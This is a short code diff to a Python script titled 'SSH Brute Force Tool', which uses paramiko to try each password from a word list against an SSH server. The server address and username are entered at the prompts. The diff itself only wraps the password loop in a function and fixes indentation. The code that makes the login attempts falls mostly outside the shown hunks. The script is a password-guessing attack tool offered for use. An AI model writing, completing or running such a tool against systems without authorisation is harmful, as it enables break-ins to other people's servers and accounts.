@@ -8,7 +8,9 @@
 import time
 import paramiko
 
-try:
+def ssh_brute_force(ip_address, username, word_list_path):
+
+    try:
         with open(word_list_path, 'r') as file:
             for password in file:
                 password = password.strip()
@@ -33,14 +35,14 @@ try:
 
 # Main Function
 def main():
-          print("SSH Brute Force Tool")
+    print("SSH Brute Force Tool")
 # Prompts the user for SSH server IP, username, and word list file path.
     ip_address = input("Enter the IP address of the SSH server: ")
     username = input("Enter the SSH username: ")
     word_list_path = input("Enter the word list file path: ")
 
 # Calls the ssh_brute_force function to attempt each word in the word list for SSH authentication.
-       ssh_brute_force(ip_address, username, word_list_path)
+    ssh_brute_force(ip_address, username, word_list_path)
 
 if __name__ == "__main__":
     main()
